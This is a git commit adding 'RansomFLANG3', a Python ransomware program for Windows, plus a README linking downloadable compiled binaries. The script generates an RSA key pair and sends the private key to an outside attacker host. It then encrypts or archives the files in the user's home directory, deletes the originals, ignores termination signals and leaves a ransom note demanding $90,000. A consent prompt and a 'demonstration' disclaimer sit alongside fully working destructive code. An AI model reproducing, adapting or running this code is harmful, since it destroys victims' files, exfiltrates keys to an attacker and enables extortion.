1bd44ce9e36ead1014ac49da6684773969f24721
r-dark-skull <r-dark-skull@outlook.in>
2021-09-27 10:07:20 +0530

    Basic Model

--- README.md
+++ README.md
@@ -1,2 +1,29 @@
-# RansomFlang3
-Basic Ransomware
+# RansomFLANG3
+Simpliest Ransomware
+
+## Linux
+**Compiled Binary :**
+https://mega.nz/file/IaoiRYKa#JTkJYntQIf6hTl09qO2Fwf9zd8ZqkR1HF-cjgNj71mQ
+
+**Virus Total Report :**
+https://www.virustotal.com/gui/file/df77ef4a887a7f99f60477f0b1e0fa1c4d3f9538c233f03960a17d78e1d643d2/detection
+
+**Safe Build Virus Total Report :**
+https://www.virustotal.com/gui/file/648ade68c887a4d1eac2929d1218fa4a652f74fa493bb3d4cc5ba943bd77fd10/detection
+
+**Safe Build Binary :**
+https://mega.nz/file/QSxkBa5S#VqdM7TvnD2DmC6w9NnuFET_xple13hxgvvpd1FxlkYk
+
+
+## Windows
+**Compiled Binary :**
+https://mega.nz/file/QKxm3CQS#9M2fidXKqIH6PuKR0POy0tfkJOea_M19KqoAk6zsWCY
+
+**Virus Total Report :**
+https://www.virustotal.com/gui/file/d1d24fec58c8d6e53d5c08adba585e4c4aced24225895db7076a374b18778591/detection
+
+**Safe Build Virus Total Report :**
+https://www.virustotal.com/gui/file/5430705b631d25ea4a49e259f6603618761b83c19502fd15dc127e5da1405114/detection
+
+**Safe Build Binary :**
+https://mega.nz/file/VLxygQBS#DL81r5DSGbu896NqUM-bFkJ1Es3_bx4Ax6aLShVCHzk
---
+++ Windows/WinFlang3.py
@@ -0,0 +1,154 @@
+import os
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+import glob
+import base64
+import hashlib
+import py7zr
+import requests
+import signal
+import pymsgbox
+import time
+
+
+# Defining Undead
+def handler(signum, stack_frame):
+    pymsgbox.alert("Just a Sec., Killing RansomFlang3..", "Terminating Fang3!!")
+    time.sleep(2)
+    pymsgbox.alert("Termination Successful.. Enjoy!", "Terminated Fang3!!")
+
+
+# Initiating Undead
+signal.signal(signal.SIGINT, handler)
+signal.signal(signal.SIGABRT, handler)
+signal.signal(signal.SIGTERM, handler)
+
+
+# Ransomware class
+def transfer(public, private):
+    keys = str(public) + str(private)
+    keystr = base64.b64encode(keys.encode())
+
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+               "Accept-Language": "en-US,en;q=0.5",
+               "Accept-Encoding": "gzip, deflate",
+               "Referer": "http://h4ck3r.great-site.net/RansomFLANG3/capture.php",
+               "Connection": "keep-alive",
+               "Cookie": "__test=c4fb31400808230905e8bd4e7427142f",
+               "Upgrade-Insecure-Requests": "1",
+               "Cache-Control": "max-age=0"
+               }
+    response = requests.get(f"http://h4ck3r.great-site.net/RansomFLANG3/capture.php?key={keystr.decode()}&i=1",
+                            headers=headers)
+
+
+class RansomFLANG3:
+    def __init__(self):
+        self.public = None
+        self.password = None
+        self.generator()
+
+    def generator(self):
+        keys = RSA.generate(4096)
+        self.public = keys.publickey()
+        publicPEM = self.public.exportKey()
+        privPEM = keys.exportKey()
+        self.password = hashlib.md5(str(privPEM).encode()).hexdigest()
+        self.encryptor()
+        transfer(publicPEM, privPEM)
+
+    def encryptor(self):
+
+        try:
+            encryp = PKCS1_OAEP.new(self.public)
+            with open(f"{os.path.expanduser('~')}/Encrypts.txt",'a') as writeout:
+                writeout.write(str("List of Infected Files : \n"))
+
+                for file in glob.glob(f"{os.path.expanduser('~')}/**", recursive=True):
+
+                    if os.path.isfile(file):
+
+                        if os.path.getsize(file) > 5242880:
+
+                            try:
+
+                                with py7zr.SevenZipFile(f"{file}.FLANG3", mode='w', password=self.password) as archive:
+                                    archive.write(file, )
+                                os.remove(file)
+                                writeout.write(str(file+"\n"))
+                            except:
+                                pass
+
+                        else:
+
+                            try:
+                                encfile = hashlib.md5((str(file) + '.FLANG3').encode()).hexdigest()
+                                with open(f'{encfile}', 'a') as encfp:
+                                    with open(file, 'rb') as orgfp:
+                                        def rsa_encrypt(pubkey, msg, length=400):
+                                            res = []
+                                            for i in range(0, len(msg), length):
+                                                res.append(str(pubkey.encrypt(msg[i:i + length])))
+                                            return "".join(res)
+
+                                        b64str = base64.b64encode(orgfp.read())
+                                        encstr = rsa_encrypt(encryp, b64str)
+                                        encfp.write(encstr)
+
+                                writeout.write(str(file+"\n"))
+                                os.remove(file)
+                                os.replace(f'{encfile}', f'{file}.FLANG3')
+                            except:
+                                pass
+        except:
+            pass
+
+        self.show()
+
+    def show(self):
+        RansomString = f'''Your System is Infected With RansomFLANG3!!!
+Mail Your Victim ID to us at userhashc0de@tutanota.com with $90000 USD ready.
+-------------------
+Your Victim ID is :
+-------------------
+
+{self.public.exportKey()}
+
+
+
+
+
+---------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------
+
+Okay, Demonstration ends Here!!
+
+---------------
+If You are a Victim, I don't Know How you end-up in this Mess, and I am not responsible for this at all.
+
+But Whatever Don't Panic Visit [ https://bit.ly/3lZHIAu ]
+Get all the base64 strings and decode them, match with your ID, and copy the Merged Private Key.
+Download the RansomFLANG3 Decoder Form [ https://bit.ly/3AK4pgr ].
+If it is not there then wait for a few weeks, I will upload it and you are Good to go.
+
+If you are not Patient Enough, Then Download the Source Code [ http://h4ck3r.great-site.net/RansomFLANG3/source.py ] and design your own Decoder.
+
+## If Source code is also not available then you are a Month Early, I am Sorry but you have no option either to wait for 1 month at least or to accept the Lose.
+'''
+
+        showfile = open(f"{os.path.expanduser('~')}/RansomFLANG3.txt", 'a')
+        showfile.write(RansomString)
+
+
+# Initiate Ransomware
+def main():
+    consent = input('This is a RansomWare `RansomFLANG3`.\nWhatever Happens Next I am not Responsible\nIf you wish to '
+                    'abort then type "exit" : ')
+    if consent != 'exit':
+        RansomFLANG3()
+    else:
+        print('Your system is safe')
+
+
+main()
